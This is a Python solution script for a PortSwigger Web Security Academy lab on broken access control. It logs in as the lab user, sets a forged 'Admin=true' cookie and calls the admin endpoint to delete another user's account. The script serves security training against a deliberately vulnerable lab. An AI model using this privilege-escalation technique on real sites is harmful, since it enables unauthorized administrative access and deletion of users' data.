# Lab: User role controlled by request parameter
# https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter 

import requests
from bs4 import BeautifulSoup

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

# Login with wiener:peter
response = session.get(f"{base_url}/login")
soup = BeautifulSoup(response.text, 'html.parser')

csrf = soup.find("input", {"name": "csrf"})['value']

login_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
response = session.post(f"{base_url}/login", data=login_data)



# Exploit
exploit_url = f"{base_url}/admin/delete?username=carlos"
session.cookies.set("Admin", "true")
response = session.get(exploit_url)
if "Congratulations" in response.text:
    print("Lab solved")
else:
    print("Exploit did not work")
